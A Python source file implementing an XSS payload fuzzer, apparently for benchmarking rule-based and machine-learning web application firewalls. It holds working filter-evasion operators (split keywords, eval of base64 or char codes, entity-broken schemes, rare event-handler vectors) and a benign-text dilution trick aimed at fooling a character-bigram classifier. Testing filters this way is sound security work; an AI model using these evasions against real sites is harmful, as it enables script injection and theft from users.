"""Small, syntax-preserving-ish XSS payload mutator.

The fuzzer changes representation and context around an existing payload; it
does not execute JavaScript.  It is intentionally conservative so that the
original payload remains recognizable in benchmark logs.
"""

import base64
import random
import re


def _random_text(length=6):
    alphabet = "xX sS tT 0123456789".replace(" ", "")
    return "".join(random.choice(alphabet) for _ in range(length))


def _split_markup(payload):
    """Split a payload into (context_prefix, markup) at the first '<'.

    Dataset entries are reflected-XSS URLs such as ``.../page.php?ref=><script>
    alert(1)</script>``. The prefix is the URL/reflection context and must be
    preserved; only the injected markup should be rewritten. When there is no
    ``<`` the whole payload is treated as markup.
    """
    index = payload.find('<')
    if index == -1:
        return '', payload
    return payload[:index], payload[index:]


def tag_case(payload):
    """Randomise the case of HTML tag names and closing-tag markers."""
    tag_pattern = re.compile(r"(<\/?)([A-Za-z][\w:-]*)")

    def replace(match):
        name = "".join(c.upper() if random.random() < 0.5 else c.lower()
                       for c in match.group(2))
        return match.group(1) + name

    return tag_pattern.sub(replace, payload)


def comments_injection(payload):
    """Insert an HTML comment at a safe boundary or before a closing tag."""
    comment = "<!--" + _random_text() + "-->"
    closing = re.search(r"</[A-Za-z][^>]*>", payload)
    if closing:
        position = random.choice([closing.start(), closing.end()])
    else:
        position = random.randrange(len(payload) + 1)
    return payload[:position] + comment + payload[position:]


def comments_rewriting(payload):
    """Rewrite an existing HTML/JavaScript comment, if one is present."""
    patterns = [r"<!--.*?-->", r"/\*.*?\*/", r"//[^\r\n]*"]
    for pattern in patterns:
        if re.search(pattern, payload, flags=re.DOTALL):
            return re.sub(pattern, "<!--" + _random_text() + "-->", payload,
                          count=1, flags=re.DOTALL)
    return payload


def invariant_tags(payload):
    """Wrap only the injected markup in an inert element, keeping the prefix.

    Wrapping the whole string (URL included) produced non-equivalent payloads;
    wrapping just the markup region leaves the reflection context and the
    executable fragment intact.
    """
    prefix, markup = _split_markup(payload)
    if not markup:
        return payload
    tag = random.choice(["b", "span", "i", "div"])
    return f"{prefix}<{tag}>{markup}</{tag}>"


def attribute_context(payload):
    """Move the executable body into an event-handler context, keeping prefix.

    Extracts the JavaScript body from the injected markup (a ``<script>`` body
    or an ``alert``/``confirm``/``prompt`` call) and rebuilds it as an
    equivalent event-handler vector, preserving the reflection prefix. Using
    less-common handlers (``ontoggle``, ``onpageshow``) adds signature variety.
    The fuzzer never renders or executes the result.
    """
    prefix, markup = _split_markup(payload)
    script_match = re.search(
        r"<script(?:\s[^>]*)?>(.*?)</script>",
        markup,
        flags=re.IGNORECASE | re.DOTALL,
    )
    if script_match:
        body = script_match.group(1).strip()
    else:
        call = re.search(r"\b(?:alert|confirm|prompt)\s*\([^()]*\)", markup, re.IGNORECASE)
        body = call.group(0) if call else ''
    if not body:
        return payload

    # Keep quote characters from prematurely terminating the generated value.
    attribute_body = body.replace('"', "&quot;").replace("'", "&#39;")
    variants = [
        f'<img src="x" onerror="{attribute_body}">',
        f'<svg onload="{attribute_body}"></svg>',
        f'<details open ontoggle="{attribute_body}"></details>',
        f'<body onpageshow="{attribute_body}"></body>',
    ]
    return prefix + random.choice(variants)


def js_comments_injection(payload):
    """Add a JavaScript comment around whitespace or an expression boundary."""
    if re.search(r"\s+", payload):
        return re.sub(r"\s+", "/**/", payload, count=1)
    return payload


def js_argument_rewrite(payload):
    """Replace a numeric function argument with an equivalent expression.

    Every generated expression evaluates to the original integer.  This keeps
    the mutation focused on representation rather than changing the argument's
    value or type.
    """
    function_pattern = re.compile(r"\b(alert|confirm|prompt)\s*\(([^()]*)\)", re.I)
    match = function_pattern.search(payload)
    if not match:
        return payload

    argument = match.group(2).strip()
    if not re.fullmatch(r"[+-]?\d+", argument):
        return payload

    value = int(argument)
    offset = random.randint(1, 9)
    equivalents = [
        f"({value}+0)",
        f"({value}-0)",
        f"({value}*1)",
        f"({value}/1)",
        f"(({value}+{offset})-{offset})",
        f"({value}+({offset}-{offset}))",
    ]
    replacement = f"{match.group(1)}{random.choice(equivalents)}"
    return payload[:match.start()] + replacement + payload[match.end():]


def js_function_alias(payload):
    """Use an equivalent common JavaScript call where possible."""
    replacements = {
        "alert": ["window.alert", "globalThis.alert"],
        "confirm": ["window.confirm", "globalThis.confirm"],
        "prompt": ["window.prompt", "globalThis.prompt"],
    }
    pattern = re.compile(r"\b(alert|confirm|prompt)(?=\s*\()", re.I)
    return pattern.sub(lambda m: random.choice(replacements[m.group(1).lower()]), payload, count=1)


def js_operator_rewrite(payload):
    """Reserved for context-aware operator mutations.

    JavaScript operators such as ``==``/``===`` and ``&&``/``&`` are not
    generally equivalent, so this strategy intentionally leaves the payload
    unchanged until an expression-aware implementation is available.
    """
    return payload


# ---------------------------------------------------------------------------
# Evasion operators
#
# These disguise the detection signature (the literal ``alert(`` /
# ``javascript:`` / quoted-handler tokens that rule-based and ML filters key
# on) while preserving execution and meaning: each result pops the same dialog
# as the original. They are what let a mutated payload slip past a filter
# instead of merely changing representation around an intact signature.
# ---------------------------------------------------------------------------

def _call_pattern():
    return re.compile(r"\b(alert|confirm|prompt)\s*\(([^()]*)\)", re.IGNORECASE)


def js_keyword_split(payload):
    """``alert(1)`` -> ``window['al'+'ert'](1)`` - same call, no ``alert(`` token."""
    match = _call_pattern().search(payload)
    if not match:
        return payload
    name = match.group(1)
    if len(name) < 2:
        return payload
    cut = random.randint(1, len(name) - 1)
    accessor = random.choice(["window", "self", "globalThis", "top"])
    replacement = f"{accessor}['{name[:cut]}'+'{name[cut:]}']({match.group(2)})"
    return payload[:match.start()] + replacement + payload[match.end():]


def js_eval_base64(payload):
    """Replace a call with ``eval(atob('<base64>'))`` - equivalent, token-free."""
    match = _call_pattern().search(payload)
    if not match:
        return payload
    encoded = base64.b64encode(match.group(0).encode("utf-8", "ignore")).decode("ascii")
    replacement = f"eval(atob('{encoded}'))"
    return payload[:match.start()] + replacement + payload[match.end():]


def js_fromcharcode(payload):
    """Replace a call with ``eval(String.fromCharCode(...))`` - equivalent."""
    match = _call_pattern().search(payload)
    if not match:
        return payload
    codes = ",".join(str(ord(char)) for char in match.group(0))
    replacement = f"eval(String.fromCharCode({codes}))"
    return payload[:match.start()] + replacement + payload[match.end():]


def scheme_obfuscation(payload):
    """Break the ``javascript:`` token with an entity it still decodes to.

    In an HTML attribute/URI context the browser decodes the entity before
    parsing the scheme, so execution is unchanged while the literal
    ``javascript:`` signature is gone.
    """
    match = re.search(r"javascript:", payload, re.IGNORECASE)
    if not match:
        return payload
    variants = [
        "java&#09;script:",
        "java&#x09;script:",
        "jav&#97;script:",
        "javas&#99;ript:",
    ]
    return payload[:match.start()] + random.choice(variants) + payload[match.end():]


def quoteless_vector(payload):
    """Rewrite ``<script>BODY</script>`` as a compact, separator-obfuscated tag.

    Dropping quotes and using ``/`` or a tab as the attribute separator is a
    well-known rule-bypass that browsers still execute.
    """
    prefix, markup = _split_markup(payload)
    match = re.search(r"<script(?:\s[^>]*)?>(.*?)</script>", markup,
                      flags=re.IGNORECASE | re.DOTALL)
    if not match:
        return payload
    body = match.group(1).strip()
    if not body or ('"' in body or "'" in body):
        # Only emit a quoteless handler when the body has no quotes to clash.
        return payload
    variant = random.choice([
        f"<svg/onload={body}>",
        f"<svg\tonload={body}>",
        f"<img/src/onerror={body}>",
    ])
    return prefix + markup[:match.start()] + variant + markup[match.end():]


# ---------------------------------------------------------------------------
# Pentester vectors
#
# These mirror what an analyst reaches for off an XSS cheat sheet: less-common
# tag/handler combinations, unicode-escaped identifiers, alternative call forms
# and browser-tolerated tag separators. All preserve execution.
# ---------------------------------------------------------------------------

def _extract_js_body(markup):
    """Pull the executable JS out of injected markup (script body or a call)."""
    script = re.search(r"<script(?:\s[^>]*)?>(.*?)</script>", markup,
                       flags=re.IGNORECASE | re.DOTALL)
    if script:
        return script.group(1).strip()
    call = re.search(r"\b(?:alert|confirm|prompt)\s*\([^()]*\)", markup, re.IGNORECASE)
    return call.group(0) if call else ''


def rare_event_vector(payload):
    """Rebuild the JS body as a less-common tag/handler vector from the cheat sheet."""
    prefix, markup = _split_markup(payload)
    body = _extract_js_body(markup)
    if not body:
        return payload
    attr = body.replace('"', "&quot;").replace("'", "&#39;")
    variant = random.choice([
        f'<marquee onstart="{attr}"></marquee>',
        f'<video><source onerror="{attr}"></video>',
        f'<audio src=x onerror="{attr}"></audio>',
        f'<input autofocus onfocus="{attr}">',
        f'<select autofocus onfocus="{attr}"></select>',
        f'<svg><animate onbegin="{attr}" attributeName=x dur=1s></svg>',
        f'<keygen autofocus onfocus="{attr}">',
    ])
    return prefix + variant


def js_unicode_escape(payload):
    """Replace a letter of the sink name with a JS unicode escape.

    ``\\u0061lert`` is a valid JavaScript identifier for ``alert`` inside a
    script or event-handler context, so execution is unchanged while the
    literal keyword no longer appears.
    """
    match = re.search(r"\b(alert|confirm|prompt|eval)\b", payload)
    if not match:
        return payload
    name = match.group(1)
    i = random.randrange(len(name))
    escaped = name[:i] + "\\u%04x" % ord(name[i]) + name[i + 1:]
    return payload[:match.start()] + escaped + payload[match.end():]


def js_call_variation(payload):
    """Vary the invocation form to defeat ``name(`` signature rules.

    Grouped references ``(alert)(1)`` / ``[alert][0](1)`` keep any argument;
    the backtick template ``alert`1``` drops the parentheses entirely and is
    only used when the argument is a bare number so the call stays equivalent.
    """
    match = re.search(r"\b(alert|confirm|prompt)\s*\(\s*([^()]*?)\s*\)", payload, re.IGNORECASE)
    if not match:
        return payload
    name, arg = match.group(1), match.group(2).strip()
    variants = [f"({name})({arg})", f"[{name}][0]({arg})"]
    if re.fullmatch(r"[+-]?\d*", arg):
        variants.append(f"{name}`{arg}`")
    return payload[:match.start()] + random.choice(variants) + payload[match.end():]


def tag_separator_obfuscation(payload):
    """Swap the space after a tag name for a browser-tolerated separator.

    Browsers accept ``/``, tab, newline or form-feed between a tag name and its
    first attribute, so ``<img/onerror=...>`` still runs while evading rules
    that expect ``<img `` followed by a space.
    """
    match = re.search(r"(<\s*[A-Za-z][\w:-]*)\s+(?=[A-Za-z])", payload)
    if not match:
        return payload
    sep = random.choice(["/", "\t", "\n", "\x0c", "//", "/ /"])
    return payload[:match.end(1)] + sep + payload[match.end():]


_BENIGN_WORDS = (
    "the quick brown fox jumps over a lazy dog while people read the news and "
    "share photos of their family holidays booking hotels flights and trains "
    "for summer travel around europe with friends looking at menus recipes and "
    "reviews of local restaurants shops libraries museums gardens and parks "
    "where children play football tennis and ride bicycles on sunny afternoons "
    "students study history science music and art at school and university "
    "writing essays about weather markets farming business health and education"
).split()


class XssFuzzer:
    """Generate escalating, still-functional XSS representations.

    Like SqlFuzzer, this compounds mutations cumulatively: each round builds on
    the *previous* round's payload (not a reset to the original), so the payload
    drifts progressively further across rounds. That drift is what lets the
    character-bigram ML model eventually be fooled.

    Unlike SqlFuzzer, every step is guarded: a mutation is accepted only if it
    stays within the length cap *and* still passes the structural XSS check, so
    the payload never degrades into a non-executable string that bypasses the
    classifier without being a real attack. The operators are themselves
    execution-preserving, so an accepted chain keeps the payload working.

    Finally, each returned payload is diluted with a large benign comment
    (see ``_dilute_payload``) to drive down the character-bigram weight the ML
    model keys on - the one execution-preserving lever for bypassing it. The
    dilution is applied to the output only, so the escalating core stays small.
    """

    strategies = [
        tag_case,
        comments_injection,
        comments_rewriting,
        invariant_tags,
        attribute_context,
        js_comments_injection,
        js_argument_rewrite,
        js_function_alias,
        js_keyword_split,
        js_eval_base64,
        js_fromcharcode,
        scheme_obfuscation,
        quoteless_vector,
        rare_event_vector,
        js_unicode_escape,
        js_call_variation,
        tag_separator_obfuscation,
    ]

    def __init__(self, payload, max_length=2048, max_chain=4, dilution=None):
        self.initial_payload = payload
        self.payload = payload
        self.max_length = max(128, int(max_length))
        self.max_chain = max(1, min(int(max_chain), len(self.strategies)))
        # Dilution target = total length to pad the sent payload up to with
        # benign text (0 disables it). ``None`` means "fill the whole budget".
        # Making this a knob lets a run turn dilution off and measure the
        # mutation operators in isolation, since dilution is the dominant
        # lever against the character-bigram ML WAF.
        if dilution is None:
            self.dilution_target = self.max_length
        else:
            self.dilution_target = max(0, min(int(dilution), self.max_length))
        self.dilute = self.dilution_target > 0
        # With dilution on, keep the escalating markup core small so the benign
        # text can dominate; with it off, let the core use the full budget.
        if self.dilute:
            self._core_cap = max(128, min(self.max_length // 3, 1200))
        else:
            self._core_cap = self.max_length
        self._emitted = set()
        self.last_operator = ''
        self.last_validation = ''

    def _dilute_payload(self, payload):
        """Fill most of the remaining length budget with benign comment text.

        A character n-gram TF-IDF classifier scores on the relative frequency
        of character bigrams. A large benign block drives the markup bigrams'
        normalised weight toward zero, which is the one execution-preserving
        way to push an XSS payload across the SVM boundary. The block sits in an
        HTML comment, so the browser ignores it and the injected script still
        runs; rule-based engines still see the intact tag.
        """
        if self.dilution_target <= 0:
            return payload
        prefix, markup = _split_markup(payload)
        if not markup:
            return payload
        budget = self.dilution_target - len(payload) - 16
        if budget < 40:
            return payload
        words, used = [], 0
        while used < budget - 12:
            word = random.choice(_BENIGN_WORDS)
            if used + len(word) + 1 > budget - 12:
                break
            words.append(word)
            used += len(word) + 1
        if not words:
            return payload
        pad = "<!-- " + " ".join(words) + " -->"
        return f"{prefix}{pad}{markup}"

    def _choose_chain(self):
        """Pick a short, ordered chain of distinct operators to compound."""
        length = random.randint(1, self.max_chain)
        pool = list(self.strategies)
        random.shuffle(pool)
        return pool[:length]

    @staticmethod
    def _validate(payload):
        """Perform conservative structural checks; do not execute the payload."""
        if not payload or not payload.strip():
            return False, 'empty'
        if any(ord(char) < 9 for char in payload):
            return False, 'control-character'
        # Note: no quote-balance check. Reflected-XSS payloads legitimately
        # carry a single break-out quote (e.g. "><script>...), so counting
        # quotes rejects valid, effective payloads and suppresses diversity.
        # A candidate should retain an executable/context marker. The list
        # covers the tags, event handlers and JS sinks the operators emit,
        # including the obfuscated forms (eval/atob/fromCharCode, split calls,
        # entity-broken schemes) so valid evasion variants are not rejected.
        marker = re.compile(
            r'<\s*(?:script|svg|img|iframe|details|body|a|video|audio|source|'
            r'object|embed|math|marquee|input|select|keygen|animate|textarea|'
            r'form)\b|'
            r'on[a-z]+\s*=|'
            r'java[^a-z]{0,6}script\s*:|'
            r"\b(?:alert|confirm|prompt|eval|atob|setTimeout|setInterval)\s*[\(`]|"
            r'fromCharCode\s*\(|'
            r'\\u00[0-9a-f]{2}|'
            r"\[\s*['\"a-z]", re.I
        )
        if not marker.search(payload):
            return False, 'no-xss-context'
        return True, 'ok'

    def fuzz(self):
        # Escalate cumulatively, like SqlFuzzer: build on the running payload
        # (self.payload), not a reset to the original, so each round drifts
        # further. Each operator in the chain is applied only if its result
        # still fits the length cap and still passes the structural XSS check;
        # otherwise that step is skipped. This keeps the escalation from ever
        # degrading the payload into a non-executable string (the flaw that
        # inflates SqlFuzzer's bypass count with broken payloads).
        # Escalate the markup core (kept under _core_cap), then dilute the
        # returned payload. Dilution is applied to the output only, never stored
        # back into self.payload, so the core keeps room to escalate each round.
        # A few chain attempts avoid wasting a duplicate send once transformed.
        for _ in range(4):
            working = self.payload
            applied = []
            for strategy in self._choose_chain():
                candidate = strategy(working)
                if candidate == working:
                    continue
                if len(candidate) > self._core_cap:
                    continue
                if not self._validate(candidate)[0]:
                    continue
                working = candidate
                applied.append(strategy.__name__)
            if applied:
                self.payload = working
                out = self._dilute_payload(working)
                self._emitted.add(out)
                self.last_operator = '+'.join(applied) + ('+dilute' if self.dilute else '')
                self.last_validation = 'ok'
                return out

        # Core has plateaued: still re-dilute (fresh filler) so the sent payload
        # varies and stays maximally diluted.
        out = self._dilute_payload(self.payload)
        self._emitted.add(out)
        self.last_operator = 'dilute' if self.dilute else 'none'
        self.last_validation = 'ok' if self.dilute else 'no-change-this-round'
        return out

    def current(self):
        return self.payload

    def reset(self):
        self.payload = self.initial_payload
        return self.payload
